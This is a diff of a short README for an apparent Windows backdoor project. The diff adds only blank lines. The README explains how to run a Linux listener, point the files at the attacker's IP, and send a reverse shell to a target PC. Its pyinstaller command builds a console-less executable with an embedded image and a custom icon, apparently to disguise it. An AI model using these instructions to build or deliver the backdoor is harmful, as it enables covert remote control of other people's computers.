@@ -1,5 +1,7 @@
 This backdoor helps us to execute commands on the target PC (Windows)
+
 Run the server.py on Linux OS and win_reverse(reverse shell should be sent to target PC(windows))
+
 Before running this, edit both the files and change the IP address to your Linux IP
 First by pyinstaller we should convert win_reverse.py into win_reverse.exe file
 Eg:pyinstaller --add-data "/root/image.jpg:," --onefile --noconsole --icon /root/image.ico win_reverse.py
